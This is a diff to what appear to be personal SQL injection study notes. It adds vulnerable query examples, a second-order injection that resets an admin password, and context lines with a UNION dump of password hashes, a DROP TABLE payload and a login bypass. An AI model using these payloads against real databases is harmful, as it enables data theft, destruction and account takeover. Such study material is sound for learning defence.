@@ -8,18 +8,24 @@ Can be used when improper input sanitization exsists
 ---
 
 Example of a SQL statement (not recommended methods!!!):
+php:
 ```php
 $sql = "SELECT * FROM users WHERE id = $id"
 ```
+python:
 ```python
 cmd = "update users set name = '%s' where id = '%s'" (name, id)
 ```
 
 ---
 
-comment = 
+comment
 ```sql 
 -- = comment
+```
+Can seperate commands with
+```sql
+;
 ```
 
 First attemt to try (show everything in the table):
@@ -63,6 +69,12 @@ username and password hash from users table:
 %' UNION SELECT user, password from users 
 ```
 
+Modify:
+```sql
+insert
+update
+```
+
 ## Blind SQLi
 Time:
 Can use time to figure out what is going on:
@@ -82,6 +94,14 @@ Example; drop table:
 a';DROP TABLE users; SELECT * FROM data WHERE 't' = 't
 ```
 
+## Second order SQLi
+Insert something that can be used later
+Insert a new user and then update the password.
+```sql
+alice '' OR username = ''admin
+
+UPDATE users set password = 'newpass' WHERE username = 'alice' OR username = 'admin'
+```
 
 ## SQLi with PHP
 
@@ -111,7 +131,7 @@ Becomes:
 ```sql
 SELECT uid from users WHERE name = '' OR 1 OR '' = '' AND pass = MD5('pass')
 ```
-
+This would make you the first user in the table. Most likly the admin.
 
 # Definition:
 In-band SQLi
